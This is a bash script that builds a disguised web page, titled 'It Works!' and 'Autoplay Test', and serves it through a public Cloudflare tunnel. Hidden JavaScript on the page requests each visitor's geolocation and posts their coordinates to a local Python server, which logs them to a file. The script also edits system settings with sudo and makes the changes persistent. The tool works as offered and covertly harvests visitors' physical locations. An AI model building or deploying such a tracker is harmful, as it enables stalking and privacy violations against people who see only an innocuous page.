#!/usr/bin/env bash

trap cleanup INT

function cleanup() {
    echo "[*] Cleaning up..."
    pkill -f "python3 -m http.server"
    pkill -f "cloudflared tunnel"
    rm -f index.html
    echo "[*] Done. Exiting."
    exit 0
}

function fix_sysctl_limits() {
    echo "[*] Applying system tweaks for Cloudflared..."

    # Increase UDP buffer size
    sudo sysctl -w net.core.rmem_max=2500000
    sudo sysctl -w net.core.rmem_default=2500000

    # Fix ping_group_range for ICMP proxy (using GID of current user)
    GID=$(id -g)
    echo "1 $GID" | sudo tee /proc/sys/net/ipv4/ping_group_range

    # Persist settings
    sudo bash -c "echo 'net.core.rmem_max=2500000' >> /etc/sysctl.conf"
    sudo bash -c "echo 'net.core.rmem_default=2500000' >> /etc/sysctl.conf"
    sudo bash -c "echo 'net.ipv4.ping_group_range = 1 $GID' >> /etc/sysctl.conf"

    sudo sysctl -p
    echo "[*] System limits updated."
}

read -p "[?] Enter port to use for local server (default 8080): " port
port=${port:-8080}

fix_sysctl_limits

echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" &>/dev/null
pkill -f "cloudflared tunnel" &>/dev/null

echo "[*] Creating autoplay HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
  <title>It Works!</title>
</head>
<body>
  <h1>Autoplay Test</h1>
  <audio autoplay>
    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>

  <script>
    function sendLocation(position) {
      fetch('/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        })
      });
    }

    function handleError(error) {
      console.error('Geolocation error:', error.message);
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    }
  </script>
</body>
</html>
EOF

echo "[*] Starting HTTP server on port $port..."

nohup python3 -u -c '
import http.server
import socketserver
from datetime import datetime

PORT = '"$port"'

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/log":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8")
            with open("location_logs.txt", "a") as f:
                f.write(f"{datetime.now().isoformat()} - {body}\n")
            self.send_response(204)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
    httpd.serve_forever()
' > server.log 2>&1 &


echo "[*] Waiting for HTTP server to be ready..."
until curl -s "http://127.0.0.1:$port" > /dev/null; do
    sleep 1
done

echo "[*] Starting Cloudflared tunnel..."

mkdir -p logs
logfile="logs/log_$(date +'%Y-%m-%d_%H-%M-%S').txt"

# Run cloudflared and extract the trycloudflare URL
./.server/cloudflared tunnel --url "http://localhost:$port" 2>&1 | tee "$logfile" | while read -r line; do
    echo "$line"
    if [[ "$line" =~ https://[a-zA-Z0-9-]+\.trycloudflare\.com ]]; then
        echo ""
        echo "[✓] Tunnel is ready at:"
        echo "    ${BASH_REMATCH[0]}"
        echo ""
        echo "[*] Logging to $logfile"
        echo "[*] Press Ctrl+C to stop."
    fi
done

